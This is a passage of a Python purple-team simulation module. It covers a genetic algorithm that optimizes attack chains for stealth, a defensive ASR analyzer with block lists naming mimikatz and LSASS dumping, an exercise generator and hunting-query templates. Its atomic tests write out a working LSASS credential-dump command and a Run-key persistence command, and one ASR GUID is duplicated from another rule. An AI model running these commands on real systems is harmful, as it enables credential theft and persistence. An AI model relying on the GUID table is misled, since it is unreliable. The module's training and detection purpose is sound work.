        self.population: List[Dict] = []
        self.best_chain: Optional[Dict] = None
        self.fitness_history: List[float] = []
        
    def initialize_population(self, seed_chain: Dict) -> None:
        """Initialize population from seed chain"""
        import random
        
        self.population = [seed_chain.copy()]
        
        # Generate variations
        for _ in range(self.population_size - 1):
            variant = self._mutate(seed_chain.copy())
            self.population.append(variant)
    
    def _mutate(self, chain: Dict) -> Dict:
        """Apply random mutation to chain"""
        import random
        
        mutation = random.choice(self.MUTATION_OPS)
        nodes = chain.get('nodes', []).copy()
        edges = chain.get('edges', []).copy()
        
        if mutation == 'add_node' and len(nodes) < 20:
            new_node = {
                'id': f"node_{len(nodes)}",
                'type': random.choice(['exploit', 'persist', 'lateral', 'exfil']),
                'name': f"Generated Node {len(nodes)}"
            }
            nodes.append(new_node)
            
        elif mutation == 'remove_node' and len(nodes) > 3:
            idx = random.randint(1, len(nodes) - 2)
            removed_id = nodes[idx].get('id')
            nodes.pop(idx)
            edges = [e for e in edges if e.get('source') != removed_id and e.get('target') != removed_id]
            
        elif mutation == 'swap_nodes' and len(nodes) > 2:
            i, j = random.sample(range(len(nodes)), 2)
            nodes[i], nodes[j] = nodes[j], nodes[i]
            
        elif mutation == 'modify_params':
            if nodes:
                node = random.choice(nodes)
                node['stealth'] = random.uniform(0.3, 0.9)
                node['duration'] = random.randint(10, 300)
        
        return {'nodes': nodes, 'edges': edges}
    
    def _calculate_fitness(self, chain: Dict) -> float:
        """Calculate fitness score for a chain"""
        nodes = chain.get('nodes', [])
        edges = chain.get('edges', [])
        
        if not nodes:
            return 0.0
        
        # Success rate (based on chain structure)
        success_rate = 0.8 - (len(nodes) * 0.02)  # Longer chains = lower success
        success_rate = max(0.3, min(0.95, success_rate))
        
        # Stealth (average node stealth)
        avg_stealth = sum(n.get('stealth', 0.5) for n in nodes) / len(nodes)
        
        # Speed (inverse of total duration)
        total_duration = sum(n.get('duration', 60) for n in nodes)
        speed = 1.0 / (1 + total_duration / 3600)
        
        # Cost efficiency
        cost_efficiency = 1.0 / (1 + len(nodes) * 0.1)
        
        # Resilience (based on redundancy/parallel paths)
        resilience = min(1.0, len(edges) / max(len(nodes), 1))
        
        # Weighted sum
        fitness = (
            self.FITNESS_WEIGHTS['success_rate'] * success_rate +
            self.FITNESS_WEIGHTS['stealth'] * avg_stealth +
            self.FITNESS_WEIGHTS['speed'] * speed +
            self.FITNESS_WEIGHTS['cost_efficiency'] * cost_efficiency +
            self.FITNESS_WEIGHTS['resilience'] * resilience
        )
        
        return round(fitness, 4)
    
    def _crossover(self, parent1: Dict, parent2: Dict) -> Dict:
        """Crossover two parent chains"""
        nodes1 = parent1.get('nodes', [])
        nodes2 = parent2.get('nodes', [])
        
        # Take first half from parent1, second half from parent2
        mid1 = len(nodes1) // 2
        mid2 = len(nodes2) // 2
        
        child_nodes = nodes1[:mid1] + nodes2[mid2:]
        
        # Rebuild edges for child
        child_edges = []
        for i in range(len(child_nodes) - 1):
            child_edges.append({
                'source': child_nodes[i].get('id'),
                'target': child_nodes[i + 1].get('id')
            })
        
        return {'nodes': child_nodes, 'edges': child_edges}
    
    def evolve(self) -> Dict:
        """Run genetic algorithm evolution"""
        import random
        
        for gen in range(self.generations):
            # Calculate fitness for all
            fitness_scores = [(chain, self._calculate_fitness(chain)) 
                            for chain in self.population]
            fitness_scores.sort(key=lambda x: x[1], reverse=True)
            
            # Track best
            best_fitness = fitness_scores[0][1]
            self.fitness_history.append(best_fitness)
            
            if self.best_chain is None or best_fitness > self._calculate_fitness(self.best_chain):
                self.best_chain = fitness_scores[0][0].copy()
            
            # Selection (top 50%)
            survivors = [chain for chain, _ in fitness_scores[:self.population_size // 2]]
            
            # Crossover and mutation to refill population
            new_population = survivors.copy()
            
            while len(new_population) < self.population_size:
                parent1, parent2 = random.sample(survivors, 2)
                child = self._crossover(parent1, parent2)
                
                # Mutate with 20% probability
                if random.random() < 0.2:
                    child = self._mutate(child)
                
                new_population.append(child)
            
            self.population = new_population
        
        return {
            'best_chain': self.best_chain,
            'best_fitness': self._calculate_fitness(self.best_chain) if self.best_chain else 0,
            'generations_run': self.generations,
            'fitness_history': self.fitness_history,
            'improvement': self.fitness_history[-1] - self.fitness_history[0] if len(self.fitness_history) > 1 else 0
        }
    
    def get_optimization_report(self) -> str:
        """Generate optimization report"""
        if not self.best_chain:
            return "No optimization has been run yet."
        
        report = [
            "=" * 60,
            "ML CHAIN OPTIMIZATION REPORT",
            "=" * 60,
            "",
            f"Generations: {self.generations}",
            f"Population Size: {self.population_size}",
            f"Best Fitness: {self._calculate_fitness(self.best_chain):.4f}",
            "",
            "FITNESS EVOLUTION",
            "-" * 40
        ]
        
        # Show fitness progression
        if self.fitness_history:
            report.append(f"Initial: {self.fitness_history[0]:.4f}")
            report.append(f"Final:   {self.fitness_history[-1]:.4f}")
            report.append(f"Change:  {(self.fitness_history[-1] - self.fitness_history[0])*100:+.2f}%")
        
        report.append("")
        report.append("OPTIMIZED CHAIN")
        report.append("-" * 40)
        
        for node in self.best_chain.get('nodes', []):
            report.append(f"  ‚Ä¢ {node.get('name', 'Unknown')} ({node.get('type', 'unknown')})")
        
        return "\n".join(report)


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# ATTACK SURFACE REDUCTION ANALYZER - Defensive recommendations
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class AttackSurfaceReductionAnalyzer:
    """
    Analyze attack chain and recommend attack surface reduction measures
    """
    
    # ASR rules (Windows Defender style)
    ASR_RULES = {
        'block_office_child': {
            'name': 'Block Office applications from creating child processes',
            'guid': '9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2',
            'blocks': ['phishing', 'macro', 'office_exploit']
        },
        'block_office_inject': {
            'name': 'Block Office applications from injecting code',
            'guid': '75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84',
            'blocks': ['injection', 'process_hollowing']
        },
        'block_js_vbs': {
            'name': 'Block JavaScript and VBScript from launching executables',
            'guid': 'd3e037e1-3eb8-44c8-a917-57927947596d',
            'blocks': ['wscript', 'cscript', 'hta']
        },
        'block_credential_steal': {
            'name': 'Block credential stealing from LSASS',
            'guid': '9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2',
            'blocks': ['mimikatz', 'credential_dump', 'lsass']
        },
        'block_untrusted_usb': {
            'name': 'Block untrusted USB processes',
            'guid': 'b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4',
            'blocks': ['usb_attack', 'removable_media']
        },
        'block_psexec': {
            'name': 'Block process creations from PSExec and WMI',
            'guid': 'd1e49aac-8f56-4280-b9ba-993a6d77406c',
            'blocks': ['psexec', 'wmi', 'remote_exec']
        },
        'block_persistence': {
            'name': 'Block persistence through WMI event subscription',
            'guid': 'e6db77e5-3df2-4cf1-b95a-636979351e5b',
            'blocks': ['wmi_persist', 'event_subscription']
        },
        'block_ransomware': {
            'name': 'Use advanced protection against ransomware',
            'guid': 'c1db55ab-c21a-4637-bb3f-a12568109d35',
            'blocks': ['ransomware', 'file_encryption', 'mass_file_change']
        }
    }
    
    # Mitigation techniques
    MITIGATIONS = {
        'network_segmentation': {
            'name': 'Network Segmentation',
            'effectiveness': 0.8,
            'blocks': ['lateral_movement', 'propagation', 'worm'],
            'implementation': 'Implement VLANs, micro-segmentation, and network ACLs'
        },
        'mfa': {
            'name': 'Multi-Factor Authentication',
            'effectiveness': 0.9,
            'blocks': ['credential_theft', 'password_spray', 'brute_force'],
            'implementation': 'Deploy MFA for all accounts, especially privileged'
        },
        'least_privilege': {
            'name': 'Least Privilege Access',
            'effectiveness': 0.75,
            'blocks': ['privilege_escalation', 'admin_abuse'],
            'implementation': 'Implement tiered admin model, remove local admin rights'
        },
        'application_whitelisting': {
            'name': 'Application Whitelisting',
            'effectiveness': 0.85,
            'blocks': ['malware', 'unauthorized_software', 'payload'],
            'implementation': 'Deploy AppLocker or WDAC policies'
        },
        'email_filtering': {
            'name': 'Email Security Gateway',
            'effectiveness': 0.7,
            'blocks': ['phishing', 'spear_phishing', 'malicious_attachment'],
            'implementation': 'Implement SPF, DKIM, DMARC, and advanced threat protection'
        },
        'endpoint_hardening': {
            'name': 'Endpoint Hardening',
            'effectiveness': 0.65,
            'blocks': ['exploitation', 'privilege_escalation', 'persistence'],
            'implementation': 'Apply CIS benchmarks, disable unnecessary services'
        },
        'backup_strategy': {
            'name': 'Offline Backup Strategy',
            'effectiveness': 0.95,
            'blocks': ['ransomware', 'data_destruction', 'extortion'],
            'implementation': 'Implement 3-2-1 backup strategy with offline copies'
        }
    }
    
    def __init__(self):
        self.analysis_results: Dict = {}
        
    def analyze_chain(self, nodes: List[Dict]) -> Dict:
        """Analyze chain and recommend ASR measures"""
        node_types = [n.get('type', '').lower() for n in nodes]
        
        # Find applicable ASR rules
        applicable_rules = []
        for rule_id, rule in self.ASR_RULES.items():
            for blocked in rule['blocks']:
                if any(blocked in nt for nt in node_types):
                    applicable_rules.append({
                        'rule_id': rule_id,
                        'name': rule['name'],
                        'guid': rule['guid'],
                        'blocks': [blocked]
                    })
                    break
        
        # Find applicable mitigations
        applicable_mitigations = []
        for mit_id, mitigation in self.MITIGATIONS.items():
            for blocked in mitigation['blocks']:
                if any(blocked in nt for nt in node_types):
                    applicable_mitigations.append({
                        'mitigation_id': mit_id,
                        'name': mitigation['name'],
                        'effectiveness': mitigation['effectiveness'],
                        'implementation': mitigation['implementation']
                    })
                    break
        
        # Calculate coverage
        asr_coverage = len(applicable_rules) / max(len(self.ASR_RULES), 1)
        mitigation_coverage = len(applicable_mitigations) / max(len(self.MITIGATIONS), 1)
        
        # Priority ranking
        applicable_mitigations.sort(key=lambda x: x['effectiveness'], reverse=True)
        
        self.analysis_results = {
            'chain_length': len(nodes),
            'node_types_analyzed': len(set(node_types)),
            'asr_rules': applicable_rules,
            'asr_count': len(applicable_rules),
            'mitigations': applicable_mitigations,
            'mitigation_count': len(applicable_mitigations),
            'asr_coverage': round(asr_coverage, 2),
            'mitigation_coverage': round(mitigation_coverage, 2),
            'overall_defense_score': round((asr_coverage + mitigation_coverage) / 2, 2)
        }
        
        return self.analysis_results
    
    def generate_defense_playbook(self) -> str:
        """Generate defensive playbook based on analysis"""
        if not self.analysis_results:
            return "No analysis has been performed yet."
        
        report = [
            "=" * 70,
            "ATTACK SURFACE REDUCTION PLAYBOOK",
            "=" * 70,
            "",
            f"Chain Analyzed: {self.analysis_results['chain_length']} nodes",
            f"Defense Score: {self.analysis_results['overall_defense_score']*100:.0f}%",
            "",
            "WINDOWS DEFENDER ASR RULES TO ENABLE",
            "-" * 50
        ]
        
        for rule in self.analysis_results.get('asr_rules', []):
            report.append(f"\n‚úì {rule['name']}")
            report.append(f"  GUID: {rule['guid']}")
            report.append(f"  Blocks: {', '.join(rule['blocks'])}")
        
        report.append("")
        report.append("RECOMMENDED MITIGATIONS (Priority Order)")
        report.append("-" * 50)
        
        for i, mit in enumerate(self.analysis_results.get('mitigations', []), 1):
            eff_bar = "‚ñà" * int(mit['effectiveness'] * 10)
            report.append(f"\n{i}. {mit['name']}")
            report.append(f"   Effectiveness: {eff_bar} {mit['effectiveness']*100:.0f}%")
            report.append(f"   Implementation: {mit['implementation']}")
        
        report.append("")
        report.append("QUICK WINS")
        report.append("-" * 50)
        report.append("1. Enable Windows Defender ASR rules in audit mode first")
        report.append("2. Deploy MFA on all privileged accounts immediately")
        report.append("3. Review and harden email filtering rules")
        report.append("4. Ensure offline backups are current and tested")
        
        return "\n".join(report)


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# PURPLE TEAM EXERCISE GENERATOR - Create realistic exercises
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class PurpleTeamExerciseGenerator:
    """
    Generate purple team exercises from attack chains
    """
    
    # Exercise templates
    EXERCISE_TYPES = {
        'tabletop': {
            'name': 'Tabletop Exercise',
            'duration_hours': 2,
            'participants': ['SOC', 'IR Team', 'Management'],
            'deliverables': ['Scenario document', 'Discussion guide', 'After-action report']
        },
        'atomic': {
            'name': 'Atomic Red Team Test',
            'duration_hours': 4,
            'participants': ['Red Team', 'Blue Team'],
            'deliverables': ['Test scripts', 'Detection validation', 'Coverage report']
        },
        'full_simulation': {
            'name': 'Full Attack Simulation',
            'duration_hours': 40,
            'participants': ['Red Team', 'Blue Team', 'Threat Intel', 'IR Team'],
            'deliverables': ['Attack report', 'Detection gaps', 'Remediation plan']
        },
        'detection_engineering': {
            'name': 'Detection Engineering Sprint',
            'duration_hours': 8,
            'participants': ['Detection Engineers', 'Threat Hunters'],
            'deliverables': ['SIEM rules', 'Dashboards', 'Playbooks']
        }
    }
    
    # Atomic test templates
    ATOMIC_TESTS = {
        'T1059.001': {
            'name': 'PowerShell Execution',
            'command': 'powershell.exe -Command "Write-Host AtomicTest"',
            'cleanup': None
        },
        'T1003.001': {
            'name': 'Credential Dumping - LSASS',
            'command': 'rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id C:\\temp\\lsass.dmp full',
            'cleanup': 'del C:\\temp\\lsass.dmp'
        },
        'T1547.001': {
            'name': 'Registry Run Key Persistence',
            'command': 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v AtomicTest /t REG_SZ /d "calc.exe" /f',
            'cleanup': 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v AtomicTest /f'
        }
    }
    
    def __init__(self):
        self.exercises: List[Dict] = []
        
    def generate_exercise(self, nodes: List[Dict], exercise_type: str = 'atomic') -> Dict:
        """Generate a purple team exercise from attack chain"""
        import uuid
        
        exercise_info = self.EXERCISE_TYPES.get(exercise_type, self.EXERCISE_TYPES['atomic'])
        
        exercise = {
            'exercise_id': f"EX-{uuid.uuid4().hex[:8].upper()}",
            'type': exercise_type,
            'name': f"{exercise_info['name']} - Attack Chain Validation",
            'duration_hours': exercise_info['duration_hours'],
            'participants': exercise_info['participants'],
            'objectives': [],
            'phases': [],
            'test_cases': [],
            'success_criteria': [],
            'deliverables': exercise_info['deliverables']
        }
        
        # Generate objectives
        exercise['objectives'] = [
            f"Validate detection capability for {len(nodes)}-stage attack chain",
            "Identify detection gaps and blind spots",
            "Test incident response procedures",
            "Measure mean time to detect (MTTD)"
        ]
        
        # Generate phases from nodes
        for i, node in enumerate(nodes):
            phase = {
                'phase_number': i + 1,
                'name': node.get('name', f"Phase {i+1}"),
                'technique': node.get('technique_id', 'Unknown'),
                'description': f"Execute {node.get('type', 'attack')} technique",
                'red_team_actions': [
                    f"Execute {node.get('type', 'technique')}",
                    "Document artifacts generated",
                    "Record timestamps"
                ],
                'blue_team_validation': [
                    "Verify alert generation",
                    "Check log visibility",
                    "Validate detection rule"
                ],
                'expected_detections': self._get_expected_detections(node)
            }
            exercise['phases'].append(phase)
            
            # Generate atomic test if applicable
            technique_id = node.get('technique_id', '')
            if technique_id in self.ATOMIC_TESTS:
                atomic = self.ATOMIC_TESTS[technique_id]
                exercise['test_cases'].append({
                    'technique_id': technique_id,
                    'name': atomic['name'],
                    'command': atomic['command'],
                    'cleanup': atomic['cleanup'],
                    'phase': i + 1
                })
        
        # Success criteria
        exercise['success_criteria'] = [
            f"Detect at least {int(len(nodes) * 0.7)} of {len(nodes)} attack phases",
            "Generate alerts within 15 minutes of execution",
            "Successfully correlate related events",
            "Trigger incident response workflow"
        ]
        
        self.exercises.append(exercise)
        return exercise
    
    def _get_expected_detections(self, node: Dict) -> List[str]:
        """Get expected detections for a node"""
        node_type = node.get('type', '').lower()
        
        detection_mapping = {
            'phish': ['Email gateway alert', 'Attachment scan alert'],
            'exploit': ['EDR behavioral alert', 'Process anomaly'],
            'credential': ['LSASS access alert', 'Credential theft detection'],
            'lateral': ['Unusual authentication', 'Network anomaly'],
            'persist': ['Registry modification alert', 'Scheduled task creation'],
            'c2': ['Beacon detection', 'DNS anomaly', 'Network traffic alert'],
            'exfil': ['DLP alert', 'Large transfer detection']
        }
        
        for key, detections in detection_mapping.items():
            if key in node_type:
                return detections
        
        return ['Generic security alert']
    
    def export_exercise_plan(self, exercise: Dict) -> str:
        """Export exercise as detailed plan document"""
        plan = [
            "=" * 70,
            f"PURPLE TEAM EXERCISE PLAN",
            "=" * 70,
            "",
            f"Exercise ID: {exercise['exercise_id']}",
            f"Type: {exercise['name']}",
            f"Duration: {exercise['duration_hours']} hours",
            f"Participants: {', '.join(exercise['participants'])}",
            "",
            "OBJECTIVES",
            "-" * 50
        ]
        
        for obj in exercise['objectives']:
            plan.append(f"  ‚Ä¢ {obj}")
        
        plan.append("")
        plan.append("EXERCISE PHASES")
        plan.append("-" * 50)
        
        for phase in exercise['phases']:
            plan.append(f"\nPHASE {phase['phase_number']}: {phase['name']}")
            plan.append(f"Technique: {phase['technique']}")
            plan.append("")
            plan.append("Red Team Actions:")
            for action in phase['red_team_actions']:
                plan.append(f"  ‚öî {action}")
            plan.append("")
            plan.append("Blue Team Validation:")
            for val in phase['blue_team_validation']:
                plan.append(f"  üõ° {val}")
            plan.append("")
            plan.append("Expected Detections:")
            for det in phase['expected_detections']:
                plan.append(f"  üì° {det}")
        
        if exercise['test_cases']:
            plan.append("")
            plan.append("ATOMIC TEST CASES")
            plan.append("-" * 50)
            for test in exercise['test_cases']:
                plan.append(f"\n[{test['technique_id']}] {test['name']}")
                plan.append(f"Command: {test['command']}")
                if test['cleanup']:
                    plan.append(f"Cleanup: {test['cleanup']}")
        
        plan.append("")
        plan.append("SUCCESS CRITERIA")
        plan.append("-" * 50)
        for criterion in exercise['success_criteria']:
            plan.append(f"  ‚úì {criterion}")
        
        plan.append("")
        plan.append("DELIVERABLES")
        plan.append("-" * 50)
        for deliverable in exercise['deliverables']:
            plan.append(f"  üìÑ {deliverable}")
        
        return "\n".join(plan)


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# BREACH SIMULATION DASHBOARD DATA - Real-time simulation metrics
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class BreachSimulationMetrics:
    """
    Track and display breach simulation metrics in real-time
    """
    
    def __init__(self):
        self.simulation_id: Optional[str] = None
        self.start_time: Optional[datetime] = None
        self.metrics: Dict[str, Any] = {}
        self.events: List[Dict] = []
        self.alerts: List[Dict] = []
        
    def start_simulation(self, chain_name: str) -> str:
        """Start a new breach simulation"""
        import uuid
        
        self.simulation_id = f"SIM-{uuid.uuid4().hex[:8].upper()}"
        self.start_time = datetime.now()
        self.metrics = {
            'chain_name': chain_name,
            'nodes_executed': 0,
            'nodes_detected': 0,
            'alerts_generated': 0,
            'time_to_first_alert': None,
            'time_to_contain': None,
            'data_accessed': 0,
            'lateral_hops': 0,
            'credentials_compromised': 0,
            'systems_compromised': 0
        }
        self.events = []
        self.alerts = []
        
        return self.simulation_id
    
    def record_event(self, event_type: str, data: Dict) -> None:
        """Record a simulation event"""
        event = {
            'timestamp': datetime.now().isoformat(),
            'elapsed_seconds': (datetime.now() - self.start_time).total_seconds() if self.start_time else 0,
            'type': event_type,
            'data': data
        }
        self.events.append(event)
        
        # Update metrics based on event type
        if event_type == 'node_executed':
            self.metrics['nodes_executed'] += 1
        elif event_type == 'node_detected':
            self.metrics['nodes_detected'] += 1
            if self.metrics['time_to_first_alert'] is None:
                self.metrics['time_to_first_alert'] = event['elapsed_seconds']
        elif event_type == 'alert_generated':
            self.metrics['alerts_generated'] += 1
            self.alerts.append(data)
        elif event_type == 'lateral_movement':
            self.metrics['lateral_hops'] += 1
        elif event_type == 'credential_access':
            self.metrics['credentials_compromised'] += data.get('count', 1)
        elif event_type == 'system_compromised':
            self.metrics['systems_compromised'] += 1
        elif event_type == 'data_accessed':
            self.metrics['data_accessed'] += data.get('size_mb', 0)
    
    def get_dashboard_data(self) -> Dict:
        """Get data for real-time dashboard display"""
        elapsed = (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
        
        detection_rate = (
            self.metrics['nodes_detected'] / max(self.metrics['nodes_executed'], 1)
        )
        
        return {
            'simulation_id': self.simulation_id,
            'status': 'running' if self.start_time else 'stopped',
            'elapsed_seconds': round(elapsed, 1),
            'elapsed_formatted': self._format_elapsed(elapsed),
            'metrics': {
                **self.metrics,
                'detection_rate': round(detection_rate * 100, 1)
            },
            'recent_events': self.events[-10:],
            'recent_alerts': self.alerts[-5:],
            'risk_level': self._calculate_risk_level()
        }
    
    def _format_elapsed(self, seconds: float) -> str:
        """Format elapsed time as HH:MM:SS"""
        hours = int(seconds // 3600)
        minutes = int((seconds % 3600) // 60)
        secs = int(seconds % 60)
        return f"{hours:02d}:{minutes:02d}:{secs:02d}"
    
    def _calculate_risk_level(self) -> str:
        """Calculate current risk level"""
        score = 0
        score += self.metrics['systems_compromised'] * 20
        score += self.metrics['credentials_compromised'] * 15
        score += self.metrics['data_accessed'] * 0.1
        score += self.metrics['lateral_hops'] * 10
        
        # Reduce score based on detections
        score -= self.metrics['nodes_detected'] * 10
        
        if score >= 100:
            return 'CRITICAL'
        elif score >= 70:
            return 'HIGH'
        elif score >= 40:
            return 'MEDIUM'
        elif score >= 20:
            return 'LOW'
        return 'MINIMAL'
    
    def generate_simulation_report(self) -> str:
        """Generate final simulation report"""
        dashboard = self.get_dashboard_data()
        
        report = [
            "=" * 70,
            "BREACH SIMULATION REPORT",
            "=" * 70,
            "",
            f"Simulation ID: {self.simulation_id}",
            f"Duration: {dashboard['elapsed_formatted']}",
            f"Risk Level: {dashboard['risk_level']}",
            "",
            "KEY METRICS",
            "-" * 50,
            f"  Nodes Executed: {self.metrics['nodes_executed']}",
            f"  Nodes Detected: {self.metrics['nodes_detected']}",
            f"  Detection Rate: {dashboard['metrics']['detection_rate']:.1f}%",
            f"  Alerts Generated: {self.metrics['alerts_generated']}",
            f"  Time to First Alert: {self.metrics['time_to_first_alert']:.1f}s" if self.metrics['time_to_first_alert'] else "  Time to First Alert: N/A",
            "",
            "IMPACT ASSESSMENT",
            "-" * 50,
            f"  Systems Compromised: {self.metrics['systems_compromised']}",
            f"  Credentials Compromised: {self.metrics['credentials_compromised']}",
            f"  Data Accessed: {self.metrics['data_accessed']:.1f} MB",
            f"  Lateral Movement Hops: {self.metrics['lateral_hops']}",
            "",
            "TIMELINE",
            "-" * 50
        ]
        
        for event in self.events[-20:]:
            report.append(f"  [{event['elapsed_seconds']:.1f}s] {event['type']}")
        
        return "\n".join(report)


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# THREAT HUNTING QUERY GENERATOR - Generate hunting queries for chains
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class ThreatHuntingQueryGenerator:
    """
    Generate threat hunting queries for various platforms based on attack chains
    """
    
    # Query templates by platform
    QUERY_TEMPLATES = {
        'splunk': {
            'process_creation': 'index=windows EventCode=4688 | search {process_filter}',
            'network_connection': 'index=network | search dest_ip={ip} OR dest_port={port}',
            'file_creation': 'index=sysmon EventCode=11 | search TargetFilename="*{path}*"',
            'registry': 'index=sysmon EventCode=13 | search TargetObject="*{key}*"',
            'powershell': 'index=windows EventCode=4104 | search ScriptBlockText="*{keyword}*"',
            'authentication': 'index=windows EventCode=4624 OR EventCode=4625 | search Account_Name={user}'
        },
        'elastic': {
            'process_creation': 'event.code:4688 AND process.name:{process}',
            'network_connection': 'destination.ip:{ip} OR destination.port:{port}',
            'file_creation': 'event.code:11 AND file.path:*{path}*',
            'registry': 'registry.path:*{key}*',
            'powershell': 'powershell.file.script_block_text:*{keyword}*',
            'authentication': 'event.code:(4624 OR 4625) AND user.name:{user}'
        },
        'kusto': {
            'process_creation': 'DeviceProcessEvents | where FileName =~ "{process}" or ProcessCommandLine contains "{command}"',
            'network_connection': 'DeviceNetworkEvents | where RemoteIP == "{ip}" or RemotePort == {port}',
            'file_creation': 'DeviceFileEvents | where FolderPath contains "{path}"',
            'registry': 'DeviceRegistryEvents | where RegistryKey contains "{key}"',
            'powershell': 'DeviceEvents | where ActionType == "PowerShellCommand" and AdditionalFields contains "{keyword}"',
